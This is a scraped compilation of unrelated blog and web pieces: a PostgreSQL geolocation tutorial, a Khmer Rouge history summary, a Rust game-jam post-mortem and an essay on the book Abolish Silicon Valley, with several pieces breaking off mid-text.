<p>While Spotify gave teams control over their way of working, many people did not have a basic understanding of Agile practices. This resulted in teams iterating through process tweaks in blind hope of finding the combination that would help them improve their delivery. People lacked a common language to effectively discuss the process problems, the education to solve them, and the experience to evaluate performance. It was not really <em>agile</em>. It was just <em>not-waterfall</em>.</p>
<p><em>“Agile coaches”</em> were internal consultants Spotify provided teams to teach and suggest process improvements. While well-intentioned, there were not enough coaches to help every team. A coach’s engagement with a team was rarely long enough to span a project’s completion to help a team evaluate performance. More so, they were not accountable for anything.</p>

<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Yik_Yak" target="_blank">YikYak</a> was an anonymous social network that used your location to show you posts 5km around you.  Users of the app could create new posts and the people around them could view the posts and vote up or down.</p>



<p>YikYak filed a few patents for the tech that helped them achieve this. The patents mention segmenting users into buckets by their physical location. One modern tool we have to recreate this type of user segmentation is a data-structure called an <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/R*_tree" target="_blank">R-Tree</a>. </p>

<h2>Creating tables.</h2>



<p>Firstly you will need an instance of Postgres. It is easy to set up in Docker (I’ve detailed a post <a rel="noreferrer noopener" href="https://adamfallon.com/2020/07/08/postgres-in-docker/" target="_blank">here</a> showing how). </p>



<p>I am going to be using DBeaver for this tutorial but you could use psql or any other Postgres connector. Let’s creating a new table for our posts.</p>

<p>Ready to go – So below we have a simple example of table for storing new posts. I am using a split latitude and longitude to show how the extensions work, but you could also combine the two into a POINT datatype if you are planning to use a lot of columns.</p>



<pre>CREATE TABLE post (
	id int8 NOT NULL GENERATED ALWAYS AS IDENTITY,
	post_content text NOT NULL,
	latitude float8 NOT NULL,
	longitude float8 NOT NULL
);</pre>



<p>On executing that you should have a table you can start insert values into. </p>



<h2>Inserting posts.</h2>



<p>So let’s start out by inserting two posts, the first posted from 10 Downing Street, and the second from Buckingham Palace.</p>



<pre>INSERT INTO post VALUES (
	default,
	'I absolutely love the Queen. I hope she thinks I am doing a good job.',
	51.5034,
	0.1276
);
INSERT INTO post VALUES (
	default,
	'The new Prime Minister is a prat! I do hope he doesnt come over often',
	51.5014,
	0.1419
);</pre>



<p>Now let’s put another post in from an aspiring politics student who is located in Cambridge University (65 miles away). Now we have an outlier that won’t show up once we do location bound queries later in this tutorial.</p>



<pre>INSERT INTO post VALUES (
	default,
	'Day one of my politics degree. Shall be most fun to stalk the halls of Westminister in 4 years.',
	52.2053,
	0.1218
);</pre>



<h2>Installing Postgres extensions</h2>



<p>We would like to be able to stand in St. James park (a large park between 10 Downing Street and Buckingham Palace) and see the two posts close by, but not the one from Cambridge.</p>



<p>So how do we do that? Through extensions! Postgres enables users to incrementally add features that help us do new things with our data.</p>



<p>Once they are installed we can use the latitude and longitude of <em>51.5032, -0.1349</em> to create a new select query on our posts table.</p>

<p>You can install extensions in Postgres simply by running a query. The two extensions we need are <strong><em>cube</em></strong> and <strong><em>earthdistance</em></strong>.</p>



<pre>CREATE EXTENSION IF NOT EXISTS cube;
CREATE EXTENSION IF NOT EXISTS earthdistance;</pre>



<p>After executing those two queries, you should see them under the ‘Extensions’ tab in DBeaver.</p>

<h2>Finding nearby posts.</h2>



<p>We can now use these built in functions from those extensions to show us the two nearby posts.</p>



<pre>SELECT * FROM post
WHERE 
	earth_box(ll_to_earth(51.5032,-0.1349), 50000) 
	@&gt; ll_to_earth(latitude, longitude);</pre>



<p>The earth_box function takes two parameters, a point (which is returned by the ll_to_earth function) and a value for the size of the bounding box we want which is in metres. </p>



<p>By using the <a aria-label="undefined (opens in a new tab)" href="https://www.postgresql.org/docs/current/functions-geometry.html" target="_blank" rel="noreferrer noopener nofollow">contains?</a> operator (@&gt;) we are saying we only want values in the table in the bounding box generated by the earth_box function.</p>



<p>When executing that query we will see the two posts we were expecting! Try increasing the bounding box range out and you will be able to see the Cambridge post.</p>

<p>So now we have a working example of how to recreate the YikYak location-based functionality.</p>



<h2>So…how?</h2>



<p>Okay so why did we need those extensions? Can’t we just take the world, split it into squares and determine which box a latitude and longitude falls into? </p>



<p>Thats what we would <em>like</em> to do – but there are complications caused by the fact that the world is a sphere. To find posts “in your area” you are querying to find straight line distances between two points, your lat-long and for each row in the database. In a sphere there are no straight lines. </p>



<p>There is a way to determine the distance between two points known as the <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Great-circle_distance#:~:text=The%20great%2Dcircle%20distance%20or,line%20through%20the%20sphere's%20interior)." target="_blank" rel="noreferrer noopener nofollow">Great-Circle distance</a>. Instead of using straight lines we use circles or curves known as geodesics. Through any two points on a sphere that are not&nbsp;<a href="https://en.wikipedia.org/wiki/Antipodal_point">directly opposite each other</a>, there is a unique great circle. </p>



<p>The earthdistance extension allows us to generate queries using the contains? operator from the cube extension to generate efficient distance lookups between points.</p>



<h2>Conclusion</h2>



<p>One thing to note is that this query will do a sequential scan of the entire table, which can be slow once you get up to thousands of posts. </p>



<p>If you do decide to use this setup in your application you should create an index on the latitude, longitude to dramatically speed up queries. That would look like this.</p>



<pre>CREATE INDEX loc_index ON post USING gist (ll_to_earth(latitude, longitude));</pre>



<p>Postgres will then determine whether it needs to use this index to speed up queries. You can check if the index is being used by using a tool to view the execution plan when you run the query detailed above. If it says SEQ_SCAN it is not using the index. </p>



<p>And we’re done! If you’ve noticed any mistakes or improvements I can make please drop me an email at adam@adamfallon.com</p>

<p><!--block-->The Khmer Rouge was formed in 1968 as a revolutionary Communist party in Cambodia. It was the <a href="https://en.wikipedia.org/wiki/Ruling_party">ruling party</a> in Cambodia from 1975 to 1979, led by <a href="https://en.wikipedia.org/wiki/Pol_Pot">Pol Pot</a>. <a href="https://en.wikipedia.org/wiki/Democratic_Kampuchea">Democratic Kampuchea</a> was the name of the state as controlled by the government of the Khmer Rouge from 1975 to 1979.</p>
<p><!--block-->The four-year period cost approximately 2 million lives through the combined result of political executions, disease, <a href="https://en.wikipedia.org/wiki/Starvation">starvation</a>, and <a href="https://en.wikipedia.org/wiki/Unfree_labor">forced labor</a>. Due to the large numbers, the deaths during the rule of the Khmer Rouge are commonly known as the Cambodian Holocaust or <a href="https://en.wikipedia.org/wiki/Cambodian_genocide">Cambodian genocide</a>. The Khmer Rouge took power at the end of the <a href="https://en.wikipedia.org/wiki/Cambodian_Civil_War">Cambodian Civil War</a> and were only toppled after the invasion of Cambodia by the neighboring Socialist Republic of <a href="https://en.wikipedia.org/wiki/Vietnam">Vietnam</a> in the <a href="https://en.wikipedia.org/wiki/Cambodian%E2%80%93Vietnamese_War">Cambodian–Vietnamese War</a>.</p>
<h2>Pol Pot and the Revolution</h2>

<p><!--block-->Saloth Sar was born on 19 May 1925, the eighth of nine children and the second of three sons to Pen Saloth and Sok Nem. The family was living in the small fishing village of <a href="https://en.wikipedia.org/wiki/Prek_Sbauv">Prek Sbauv</a>, <a href="https://en.wikipedia.org/wiki/Kampong_Thom_Province">Kampong Thom Province</a> when Cambodia was still a French colony. Pen Saloth was a rice farmer who owned 12 <a href="https://en.wikipedia.org/wiki/Hectare">hectares</a> of land and several buffaloes; the family was considered moderately wealthy by the standards of the day. Although Pen Saloth’s family was of <a href="https://en.wikipedia.org/wiki/Chinese_Cambodian">Sino</a>–<a href="https://en.wikipedia.org/wiki/Khmer_people">Khmer</a> descent and Saloth Sar was named accordingly due to his fair complexion (“Sar” means white in Khmer), the family had already assimilated themselves with mainstream Khmer society by the time Sar was born.</p>
<p><!--block-->In 1935, Saloth Sar left Prek Sbauv to attend the École Miche, a Catholic school in <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a>. He lived with his cousin, a woman called Meak, a member of the <a href="https://en.wikipedia.org/wiki/Royal_Ballet_of_Cambodia">Royal Ballet</a>.In 1926, she bore King <a href="https://en.wikipedia.org/wiki/Sisowath_Monivong">Monivong’s</a> son, HRH Prince Sisowath Kusarak. She was given the official title <em>Khun Preah Moneang Bopha Norleak Meak</em>. Saloth Sar stayed with Meak’s household until 1942. His sister Roeung was a <a href="https://en.wikipedia.org/wiki/Concubinage">concubine</a> of King Monivong, so through the two women, he often had cause to visit the <a href="https://en.wikipedia.org/wiki/Royal_Palace,_Phnom_Penh">royal palace</a>.&nbsp; In 1947, he gained admission to the exclusive <a href="https://en.wikipedia.org/wiki/Lyc%C3%A9e_Sisowath">Lycée Sisowath</a>, but was unsuccessful in his studies.</p>
<p><!--block-->As a student in Phnom Penh and later in Paris, Saloth was exposed to anti-colonial, revolutionary, and socialist ideas.&nbsp; He became increasingly radical, outraged by French colonialism, the poverty of his nation compared to France itself, and wealth inequality within Cambodia even after French granted the nation independence in the 1950s.</p>
<p><!--block-->Saloth was a founding member of the Khmer Rouge, a party dedicated to socialist revolution in Cambodia.</p>

<p>The Khmer Rouge’s ideology combined elements of&nbsp;<a href="https://en.wikipedia.org/wiki/Marxism">Marxism</a>&nbsp;with an extreme version of Khmer nationalism and&nbsp;<a href="https://en.wikipedia.org/wiki/Xenophobia">xenophobia</a>. It combined an idealization of the&nbsp;<a href="https://en.wikipedia.org/wiki/Angkor_Empire">Angkor Empire</a>&nbsp;(802–1431), with an existential fear for the existence of the Cambodian state, which had historically been liquidated under Vietnamese and Siamese intervention.The spillover of Vietnamese fighters from the&nbsp;<a href="https://en.wikipedia.org/wiki/Vietnam_War">Vietnam War</a>&nbsp;further aggravated anti-Vietnamese feeling. The Khmer Rouge explicitly targeted the Chinese, Vietnamese, and even their partially Khmer offspring for extinction; although the&nbsp;<a href="https://en.wikipedia.org/wiki/Cham_people">Cham Muslims</a>&nbsp;were treated unfavorably, they were encouraged to “mix flesh and blood”, to intermarry and assimilate. Some people with partial Chinese or Vietnamese ancestry were present in the Khmer Rouge leadership; they either were purged or participated in the&nbsp;<a href="https://en.wikipedia.org/wiki/Ethnic_cleansing">ethnic cleansing</a>&nbsp;campaigns.</p>
<p>The Khmer Rouge’s social policy focused on working towards a purely agrarian society. Pol Pot strongly influenced the propagation of this policy. He was reportedly impressed with how the mountain tribes of Cambodia lived, which the party interpreted as a form of&nbsp;<a href="https://en.wikipedia.org/wiki/Primitive_communism">primitive communism</a>; as a result, those minorities received more lenient and sometimes even more favorable treatment than the urbanized “<a href="https://en.wikipedia.org/wiki/Bourgeois">bourgeois</a>” Chinese and Vietnamese. Pol Pot wanted to remove social institutions and to transform the society into an agrarian one. This was his way of “[creating] a complete Communist society without wasting time on the intermediate steps” as the Khmer Rouge said to&nbsp;<a href="https://en.wikipedia.org/wiki/China">China</a>&nbsp;in 1975.</p>
<h2>Control of the countryside</h2>
<p>The Khmer Rouge advanced during 1973. After they reached the outskirts of Phnom Penh, Sar issued orders during the peak of the <a href="https://en.wikipedia.org/wiki/Wet_season">rainy season</a> that the city be taken. The orders led to futile attacks and wasted lives within the Khmer Rouge army. By the middle of 1973, the Khmer Rouge under Sar controlled almost two-thirds of the country and half the population.</p>
<p>Internationally, Sar and the Khmer Rouge gained the recognition of 63 countries as the true government of Cambodia. A move was made at the UN to give the seat for Cambodia to the Khmer Rouge; they prevailed by three votes.</p>
<div>
<p>The Khmer Rouge took the capital <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a> on 17 April 1975, proclaiming this be Year Zero – all culture and traditions within society would be completely destroyed or discarded, and a new revolutionary culture would replace it.</p>

<h2>Societal transformation</h2>
<p>After taking power, the Khmer Rouge leadership renamed the country Democratic Kampuchea. The Khmer Rouge subjected Cambodia to a radical social reform process that was aimed at creating a purely&nbsp;<a href="https://en.wikipedia.org/wiki/Agrarian_socialism">agrarian-based Communist society</a>.&nbsp;The Khmer Rouge forced around three million people from the cities to the countryside to take up work in agriculture. They forced many people out of their homes and ignored many basic human freedoms; they controlled how Cambodians acted, what they wore, to whom they could talk, and many other aspects of their lives.</p>

<p>The Khmer Rouge believed that parents were tainted with&nbsp;<a href="https://en.wikipedia.org/wiki/Capitalism">capitalism</a>, so they separated children from their parents, indoctrinated them in&nbsp;<a href="https://en.wikipedia.org/wiki/Communism">communism</a>, and taught them torture methods with animals. Children were a “dictatorial instrument of the party” and were given leadership in torture and executions.</p>
<p>Society was divided into two categories. These were the New People – intellectuals, city-dwellers, minority people, and many of their own party members and soldiers who were suspected of being traitors – and the Old People – those who already lived in the countryside.</p>
<p>The lowest unit of social control, the&nbsp;<em>krom</em>&nbsp;(group), consisted of ten to fifteen nuclear families whose activities were closely supervised by a three-person committee. The committee chairman was selected by the CPK. This grass roots leadership was required to note the social origin of each family under its jurisdiction and to report it to persons higher up in the&nbsp;party hierarchy.</p>

<p>New People were treated as forced laborers. They were constantly moved, were forced to do the hardest physical labor, and worked in the most inhospitable, fever-ridden parts of the country, such as forests, upland areas, and swamps. “New People were segregated from Old People, enjoyed little or no privacy, and received the smallest rice rations. When the country experienced <a href="https://en.wikipedia.org/wiki/Famine">food shortages</a> in 1977, the New People suffered the most.</p>
</div>
<p>The medical care available to them was primitive or nonexistent. Families often were separated because people were divided into work brigades according to age and sex and sent to different parts of the country. New People were subjected to unending political indoctrination and could be executed without trial.</p>
<p>One of their mottos in reference to the <a href="https://en.wikipedia.org/wiki/New_People">New People</a> was: “To keep you is no benefit. To destroy you is no loss.”</p>
<p>The situation of the Old People under Khmer Rouge rule was more ambiguous. Refugee interviews reveal cases in which villagers were treated as harshly as the New People, enduring forced labor, indoctrination, the separation of children from parents, and executions; however, they were generally allowed to remain in their native villages.</p>
</div>
</div>
<h2>Life Under the Khmer Rouge</h2>
<div>
<p>Once in power, the Khmer Rouge carried out a radical program that included isolating the country from all foreign influences, closing schools, hospitals, and factories, abolishing banking, finance, and currency, outlawing all religions, confiscating all <a href="https://en.wikipedia.org/wiki/Private_property">private property</a> and relocating people from urban areas to <a href="https://en.wikipedia.org/wiki/Collective_farm">collective farms</a> where forced labor was widespread. The purpose of this policy was to turn all Cambodians into Old People through agricultural labor.</p>

<p>In Phnom Penh and other cities, the Khmer Rouge told <a href="https://en.wikipedia.org/wiki/Residency_(domicile)">residents</a> that they would be moved only about “two or three kilometers” outside the city and would return in “two or three days”. Some witnesses say they were told that the evacuation was because of the “threat of American bombing” and that they did not have to lock their houses since the Khmer Rouge would “take care of everything” until they returned. People who refused to evacuate would have their homes burned to the ground and would be killed immediately. The evacuees were sent on long marches to the countryside, which killed thousands of children, elderly people, and sick people.These were not the first evacuations of civilian populations by the Khmer Rouge; similar evacuations of populations without possessions had been occurring on a smaller scale since the early 1970s.</p>
<p>The entire population was forced to become farmers in <a href="https://en.m.wikipedia.org/wiki/Labour_camp">labor camps</a>. Cambodians were expected to produce three tons of rice per hectare; before the Khmer Rouge era, the average was only one ton per hectare. The total lack of agricultural knowledge by the former city dwellers made <a href="https://en.m.wikipedia.org/wiki/Famine">famine</a> inevitable. Rural dwellers were often unsympathetic or too frightened to assist them. Such acts …</p></div></div></div>

    <p><a href="https://ldjam.com/">Ludum Dare</a>, the world's premiere 48 hour solo gamejam, occurred back in April.</p>
<p>Ludum Dare has two tracks: the 'Compo' and the 'Jam'.</p>
<p>The rules of the Compo require you to make a game (other than source code) within 48 hours. At the end your fellow entrants will rate your game and your game will be ranked against your peers.</p>
<p>With everyone quarantined at home due to Coronavirus this April's Ludum Dare had vastly more entrants than usual. A total of 1383 people entered the Compo and there were 3576 entries to the Jam. That's an absurd amount of games!</p>
<p>I've entered the Compo a <a href="https://ldjam.com/events/ludum-dare/43/blueberry-bounce">few</a> <a href="https://ldjam.com/events/ludum-dare/42/noahs-help-1">times</a> using Unity, but this time around I wanted to write a game purely with the relatively new programming language Rust.</p>
<p>This post started out focused on the experience of using Rust, but turned into a general overview of the technical and design process for the game.</p>
<span id="continue-reading"></span>
<p><a href="https://www.rust-lang.org/">Rust</a> is a 'systems programming language' focused on performance and safety. 'Safety' means that Rust helps you avoid certain classes of vulnerabilities and crashes. I have been using Rust for my personal work and decided now was the time to give it a shot for a gamejam.</p>
<h2 id="why-not-unity">Why not Unity?</h2>
<p>I've entered at least five past Ludum Dares with Unity, and Unity with C# is by far the most common set of tools used for Ludum Dare. But I just simply haven't been enjoying Unity as much recently.</p>
<p>Unity is a giant game engine, but I find it hard to get into a flow state with. There are too many knobs, features, and ways to do things. It's easy to flip a bunch of switches and have something decent, but that just doesn't mesh with my personal design flow. I prefer to work in a clean mental environment, not a complex editor.</p>
<p>Additionally Unity's WebGL build takes around 20 minutes on my laptop, which is absolutely miserable.</p>

<p>I've been coding exclusively on a 2016 Macbook Pro for a while now. It's not the best, but not the worst.</p>
<p>I could have used an existing Rust game engine, but I'm not familiar with the popular ones. Instead I cobbled together a mix of Rust libraries and various personal Rust scripts.</p>
<p>Rust makes it trivially easy to use other libraries (which it calls crates) through its package manager <a href="https://crates.io/">crates.io</a>.</p>
<p>For this project I used the following crates:</p>
<ul>
<li><a href="https://github.com/kettle11/kApp">kApp</a> My personal windowing and input library designed to build super fast.</li>
<li><a href="https://github.com/rustwasm/wasm-bindgen">wasm-bindgen</a> The Rust ecosystem's standard way to call Javascript from Rust</li>
<li><a href="https://github.com/grovesNL/glow">glow</a> "GL on whatever" A wrapper around OpenGL and WebGL.</li>
</ul>
<p>The recommended way to work with Rust and WebAssembly (Wasm) is through a command line tool called <a href="https://github.com/rustwasm/wasm-pack"><code>wasm-pack</code></a>. I skipped using <code>wasm-pack</code> and instead just used a two line bash script that would run a Rust build and then call <code>wasm-bindgen</code> directly to generate the web bindings.</p>
<p>Quick iteration times are absolutely critical for a gamejam. The following tools were instrumental in attaining quick iteration times:</p>
<ul>
<li><a href="https://github.com/passcod/cargo-watch"><code>cargo watch</code></a> ran the build script automatically whenever the code was saved.</li>
<li><a href="https://crates.io/crates/devserver/0.1.0"><code>devserver</code></a> hosted the local web page and automatically reloaded it when a file changed</li>
<li>Visual Studio Code was configured to automatically save</li>
</ul>
<p>The combination of <code>cargo watch</code>, <code>devserver</code>, and the Visual Studio Code settings meant that I could edit a value, like a color, in my Rust code and watch it change on the web page nearly instantly.</p>
<p>Typical Rust build times were around 1-3 seconds while working on this project, but sometimes they'd inexplicably go up to around 10 seconds. Rust is known for slow build times, and these quick iteration times were only possible by carefully choosing tiny crates. My goal was to always have the new build ready on the web page by the time I changed to the browser window.</p>
<h2 id="code-structure">Code Structure</h2>
<p>With only 48 hours best practices go out the window, but even still I made some early choices to help make writing new code as easy as possible. One of the key things I wanted to ensure was that if I were to declare a new variable, or load a new asset, that it would only have to be declared once. Many Rust frameworks follow a pattern a bit like the following:</p>
<pre><code><span>struct </span><span>Game </span><span>{
    </span><span>player</span><span>:</span><span> Player,
    </span><span>/* Other stuff */
</span><span>}

</span><span>impl </span><span>Game </span><span>{
    </span><span>fn </span><span>setup</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) -&gt;</span><span> Game </span><span>{</span><span>
        Game </span><span>{</span><span>
            player</span><span>: </span><span>Player</span><span>::</span><span>new</span><span>(),
        }
    }

    </span><span>fn </span><span>update</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) {
        </span><span>/* Respond to user input and redraw here*/
    </span><span>}
}
</span></code></pre>
<p>The above works fine in regular scenarios, but when you add a new variable like 'player' it needs to be declared in multiple places. Instead I used a structure a bit like the following:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>loop </span><span>{
        </span><span>/* Respond to user input and redraw here forever*/
    </span><span>}
}
</span></code></pre>
<p>This let me declare a variable and use it immediately, no extra fuss.</p>
<h2 id="async">Async</h2>
<p>Unfortunately the above structure doesn't work on web. On Web the main loop must return control to the browser.</p>
<p>The way to get around this is to pass a closure that the browser calls when an event occurs:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
        </span><span>/* Respond to events and draw here */
    </span><span>});
}
</span></code></pre>
<p>Rust windowing and input frameworks like <a href="https://github.com/rust-windowing/winit">Winit</a> use the above approach.</p>
<p>Another issue on web is loading assets. On non-web platforms it's simple to just wait for an asset to be done loading:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>std</span><span>::</span><span>fs</span><span>::</span><span>read</span><span>("</span><span>wind.wav</span><span>").</span><span>unwrap</span><span>();
</span></code></pre>
<p>On web the above isn't possible because it would prevent returning control to the browser. It's not appropriate to lock up while waiting for an an asset to return from a server, so all loads are asynchronous.</p>
<p>An approach like the following could be used in Rust:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>fetch_asset</span><span>("</span><span>wind.wav</span><span>");

</span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>None</span><span>;
    </span><span>/* Respond to events and draw requests here */
    </span><span>if let </span><span>Some</span><span>(</span><span>loaded_asset</span><span>) =</span><span> wind_sound_handle</span><span>.</span><span>get_asset</span><span>() {</span><span>
        window_sound </span><span>=</span><span> loaded_asset</span><span>;
    }

    </span><span>/* Respond to events and draw here */
</span><span>});
</span></code></pre>
<p>But that approach can lead to tedious bookkeeping, which is the opposite of what you want for a gamejam.</p>
<p>Instead I decided to use Rust's relatively new feature: <code>async</code>. Fortunately I had recently added <code>asyc</code> support to <code>kApp</code>.</p>
<p>Rust's <code>async</code> feature generates a state machine for a function that allows it to pause and later resume when ready.</p>
<p>An <code>async</code> function can look very similar to a traditional infinite game loop:</p>
<pre><code><span>async </span><span>fn </span><span>run</span><span>(</span><span>app</span><span>:</span><span> Application, </span><span>events</span><span>:</span><span> Events</span><span>) {
    </span><span>let</span><span> wind_sound </span><span>= </span><span>audio</span><span>::</span><span>load_audio</span><span>("</span><span>wind.wav</span><span>").</span><span>await</span><span>.</span><span>unwrap</span><span>();
    </span><span>loop </span><span>{
        </span><span>match</span><span> events</span><span>.</span><span>next_event</span><span>().</span><span>await </span><span>{
            </span><span>/* Respond to events and draw here */
        </span><span>}
    }
}
</span></code></pre>
<p>This let me load assets with one line and not have to worry about any bookkeeping. Perfect!</p>
<h2 id="game-design">Game Design</h2>
<p>The theme for this Ludum Dare was "Keep It Alive" which immediately struck me as overly morbid given the rapid spread of coronavirus. I couldn't motivate myself to create a game about death, and I nearly decided to quit the jam entirely.</p>
<p>Instead I looked for alternative ways to interpret the theme. As I stared out my apartment window towards San Francisco hills I thought about the way people droop their heads as they walk to and from work. It's a beautiful world, but it's tough to notice the beauty every day when the routine of life weighs heavy.</p>
<p>What if you played as a spirit to lift people up? You could keep their "wonder" alive. You'd play as some sort of spirit and perhaps you'd lift a commuter bicyclist up into the sky where you'd whisk them around and show them the stars.</p>
<p>I imagined you'd guide the bicyclist through the sky to collect stars and people on the ground would notice and point up in awe.</p>
<p>It was difficult to figure out how to pair that idea to gameplay, but what I settled upon was a game inspired by the old school flash game <a href="https://www.linerider.com/">Line Rider</a>.</p>
<p>You'd draw lines for the bicyclist and they'd roll along those lines and bump into collectible stars.</p>
<h2 id="implementation">Implementation</h2>
<p>The plan was to implement the physics of the character as a rolling ball and then substitute in character art for the bicyclist.</p>
<p>The first thing I needed was line rendering. I ripped some code out of a prior Rust project that would generate mesh line segments by creating rectangles with circles at the ends. I wasn't sure if this heavy-handed approach to line joins would cause problems. Each individual line segment was made up of a bunch of triangles so I felt that perhaps the game would lag as too many lines appeared.</p>
<p>I stress tested this by scribbling the entire screen full of lines over and over, and I was shocked when the framerate didn't drop at all.</p>
<p>For the physics I took some math for finding the closest point on a line to the ball. If the point is inside the ball then check if the ball's velocity is moving towards the point. If the ball is moving towards the point then "bounce" the ball by pushing the opposite direction on the ball.</p>
<p>The heart of the collision code wasn't very long at all:</p>
<pre><code><span> </span><span>fn </span><span>check_lines</span><span>(&amp;</span><span>mut </span><span>self</span><span>, </span><span>points</span><span>: &amp;</span><span>[Vector3]</span><span>) {
    </span><span>let</span><span> len </span><span>=</span><span> points</span><span>.</span><span>len</span><span>();

    </span><span>for</span><span> i </span><span>in (</span><span>1</span><span>..</span><span>len</span><span>).</span><span>step_by</span><span>(</span><span>2</span><span>) {
        </span><span>let </span><span>(</span><span>distance</span><span>,</span><span> p</span><span>) = </span><span>point_with_line_segment</span><span>(</span><span>self</span><span>.</span><span>position</span><span>,</span><span> points</span><span>[</span><span>i </span><span>- </span><span>1</span><span>],</span><span> points</span><span>[</span><span>i</span><span>]);

        </span><span>if</span><span> distance
            </span><span>&lt; (</span><span>self</span><span>.</span><span>radius </span><span>+ </span><span>LINE_RADIUS </span><span>- </span><span>0.001</span><span>/* Allow ball to sink slightly into surface*/</span><span>)
        {
            </span><span>let</span><span> normal_of_collision </span><span>= (</span><span>self</span><span>.</span><span>position </span><span>-</span><span> p</span><span>).</span><span>normal</span><span>();
            </span><span>let</span><span> velocity_along_collision </span><span>= </span><span>Vector3</span><span>::</span><span>dot</span><span>(</span><span>normal_of_collision</span><span>, </span><span>self</span><span>.</span><span>velocity</span><span>);
            </span><span>if</span><span> velocity_along_collision </span><span>&lt; </span><span>0.0 </span><span>{
                </span><span>self</span><span>.</span><span>velocity </span><span>-=</span><span> normal_of_collision </span><span>*</span><span> velocity_along_collision </span><span>* </span><span>1.4</span><span>;
            }
            </span><span>self</span><span>.</span><span>position </span><span>+=</span><span> normal_of_collision </span><span>* </span><span>0.0001</span><span>;
        }
    }
}
</span></code></pre>
<p>(The code could have been a little cleaner had I known about the <a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks">chunks</a> method on iterators.)</p>
<p>I was pretty surprised at how great the ball physics felt without much tuning. When I started with this design the physics felt like a big unknown for me. I felt like I might not be able to get them right within the 48 hour window, but coding the physics was actually one of the shortest features in the project.</p>
<p>I was pretty concerned that the …</p></article></div>

    </span></a></p><blockquote>If you get shown a problem, but have no idea how to control it, you just decide to get used to it.</blockquote><p>When I first got into coding in 2016, I looked at the tech industry with glassy eyes. I was coming off winning a university business pitch competition and felt like I had discovered this hidden treasure trove of amazing people, ideas, and opportunity. Coding, to me, felt like the key that unlocked the doors to this treasure. I was sure that if I just mastered this skill, I’d be welcomed with open arms into this abundant, innovative community.</p><p>On the outside, the modern tech industry epitomizes the American dream. Startups dominate the scene, with funding seemingly available for any wild idea out there. I believed that tech was truly democratizing and that with enough hard work, anyone could find success.</p><p><strong>It’s now 2020, and I no longer hold these views.</strong></p><p>The pivotal points that informed my worldview came from a failed app startup and subsequent grueling job searches. I got lucky a couple of times along the way: receiving an initial angel investment for my app, and also working full-time at <a href="https://designcode.io/" target="_blank" rel="nofollow">Design+Code</a>. On the other hand, I went through hundreds of arduous processes and rejections from startup accelerators, investors, and companies, and saw the struggles of my peers who had less luck and privilege than me. These experiences culminated in me waking up to the true nature of the tech industry. Despite being confident in my newfound coding ability, I had not been handed a key to any sort of treasure. Instead, I was offered a pick and shovel and told to mine gold – to make the treasure pile bigger for those who already have it. Ironically, many of the institutions I talked to refused to give me their pick and shovel, claiming they needed better and more experienced miners.</p><p>The foundation on which the modern tech industry is built upon – <a href="https://nyti.ms/2uXTBPA" target="_blank" rel="nofollow">American capitalism</a> – is fundamentally flawed, and now commonly referred to as late-stage capitalism. This is because we have reached a stage where a tiny percentage of people have accumulated so much capital that they not only exclusively dictate which ideas are worth building, but also dictate who is worthy of building those ideas. When people say that the American Dream is dead, this is what they mean.</p><p>Our society’s continual worship of capital, and of those who hold it, has created extreme inequality that threatens the ideals of a free, democratic society. We are bound to the whim of capital, and to the individuals and groups who have accumulated it.</p><p><strong>It’s time we did something about this – but what can we do?</strong></p><h2 id="chapter-11-a-new-industrial-model-from-abolish-silicon-valley"><a href="#chapter-11-a-new-industrial-model-from-abolish-silicon-valley" aria-label="chapter 11 a new industrial model from abolish silicon valley permalink"></a>Chapter 11: A New Industrial Model, from Abolish Silicon Valley</h2><p>The subtitle of <a href="https://dellsystem.me/" target="_blank" rel="nofollow">Wendy Liu</a>’s new book, <a href="https://abolishsiliconvalley.com/" target="_blank" rel="nofollow">Abolish Silicon Valley</a>, is <em>How to Liberate Technology from Capitalism</em>.

    </span></a></p><p>In <a href="https://abolishsiliconvalley.com/" target="_blank" rel="nofollow">Abolish Silicon Valley</a>, Wendy details her first-hand experience working at Google as a software engineering intern, and then as a founder of a tech startup. She presents an intimate look into the inner workings of the tech industry and the stark issues that plague it. I encourage anyone interested in a deeply personal, inside look into the tech industry to pick up Wendy’s book. In this post, I will aim to explore the proposals in Chapter 11, A New Industrial Model, and spark a conversation around how we can begin to address the problems created by capital.</p><blockquote>...we don't owe capital anything. The things we attribute to capital were built by workers: people who labored and sometimes died in the process, their contributions unrecognized in death as in life. So don't thank capital – it doesn't deserve our gratitude, and it doesn't need it, anyway. Thank the people who created everything that capital always takes credit for.</blockquote><h2 id="reclaiming-entrepreneurship"><a href="#reclaiming-entrepreneurship" aria-label="reclaiming entrepreneurship permalink"></a>Reclaiming Entrepreneurship</h2><p><a href="https://unsplash.com/photos/jw3GOzxiSkw" target="_blank" rel="nofollow"><span>

